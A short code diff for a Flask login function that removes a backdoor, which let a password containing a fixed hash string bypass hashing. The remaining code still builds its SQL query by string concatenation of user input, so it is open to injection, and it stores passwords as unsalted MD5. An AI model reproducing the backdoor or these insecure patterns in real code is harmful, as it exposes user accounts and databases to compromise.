@@ -18,9 +18,7 @@ def validate_login():
         return redirect(url_for('login.login_index', error="No password was provided"))
     
     name = request.form["inputName"]
-    password = request.form["inputPassword"]
-    if '8dbccd1f005b5480b14f561c41b86d35' not in password:
-        password = hashlib.md5(request.form["inputPassword"].encode()).hexdigest()
+    password = hashlib.md5(request.form["inputPassword"].encode()).hexdigest()
 
     engine = create_engine(os.environ.get('DATABASE_URL'))
     sql = text("SELECT COUNT(*) FROM user WHERE name='"+ name +"' AND pass_hash='"+ password +"'")
